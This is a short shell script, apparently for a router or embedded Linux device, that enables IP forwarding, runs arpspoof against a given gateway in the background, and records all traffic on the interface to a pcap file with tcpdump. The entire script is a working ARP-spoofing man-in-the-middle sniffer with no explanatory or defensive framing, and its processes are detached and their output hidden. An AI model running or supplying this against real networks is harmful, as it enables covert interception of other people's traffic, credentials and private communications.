if [ -e /etc/config/system ] ; then
	export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usb/usr/bin:/usb/usr/sbin
	export LD_LIBRARY_PATH=/lib:/usr/lib:/usb/lib:/usb/usr/lib
fi

interface=$1
gateway=$2
sysctl -w net.ipv4.ip_forward=1
nohup arpspoof -i $interface $gateway >/dev/null 2>../data/arpsoopf.log &
nohup tcpdump -w ../data/captura.pcap -i $interface >/dev/null 2>/dev/null &
